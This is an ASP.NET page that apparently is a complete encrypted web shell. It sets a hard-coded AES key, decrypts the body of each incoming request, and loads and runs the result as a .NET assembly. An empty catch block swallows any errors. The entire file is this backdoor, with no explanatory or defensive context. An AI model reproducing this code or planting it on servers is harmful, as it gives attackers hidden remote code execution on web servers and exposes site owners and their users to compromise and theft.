<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%
    Session.Add("k","e45e329feb5d925b");
    try
    {
        byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);
        Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);
    } catch (Exception ex)
    {
    }
%>